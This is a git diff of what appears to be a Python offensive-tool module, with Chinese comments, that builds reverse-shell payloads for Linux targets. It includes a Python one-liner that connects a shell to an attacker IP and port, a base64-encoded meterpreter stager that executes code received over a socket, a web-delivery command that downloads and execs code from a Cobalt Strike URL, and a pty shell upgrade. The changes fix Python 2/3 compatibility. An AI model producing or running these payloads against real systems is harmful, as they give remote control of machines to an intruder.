@@ -2,6 +2,7 @@
 from .config import *
 import base64
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -13,7 +14,7 @@ class Shell:
         self.desc_simple_reverse = """
 适用于linux，反弹一个sh，ncat监听
 
-☁  ~  ncat -lvp 4444
+#  ncat -lvp 4444
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
@@ -57,7 +58,6 @@ while len(d)<l:
         d+=s.recv(l-len(d))
 exec(d,{{'s':s}})"""
 
-
         self.desc_web_delivery = """
 web_delivery方式传递payload
 msf-payload同时支持py2和py3
@@ -76,16 +76,17 @@ cobalt默认地址{url}
 msf比较稳定
 """.format(url=cobalt_python)
 
-
     def online_reverse(self):
         pass
 
     def simple_reverse(self, ip, port):
         call_sh = '/bin/sh'
-        return "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['{sh}','-i']);\"".format(ip=ip,port=port,sh=call_sh)
+        return "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['{sh}','-i']);\"".format(
+            ip=ip, port=port, sh=call_sh)
 
+    # base64模块的py2和py3有点不一样
     def bcode(self, ip, port):
-        return base64.b64encode(self.meter_tcp_code.format(ip=ip, port=port))
+        return str(base64.b64encode(self.meter_tcp_code.format(ip=ip, port=port).encode('utf-8')), 'utf-8')
 
     def meter_reverse(self):
         return "python -c \"import base64,sys;exec(base64.b64decode({{2:str,3:lambda b:bytes(b,'UTF-8')}}[sys.version_info[0]]('{bcode}')))\""
@@ -93,4 +94,5 @@ msf比较稳定
     def web_delivery(self):
         return "python -c \"import urllib2; exec urllib2.urlopen('{url}').read();\"".format(url=cobalt_python)
 
-
+    def tty_shell(self):
+        return "python -c \"import pty;pty.spawn('/bin/bash')\""
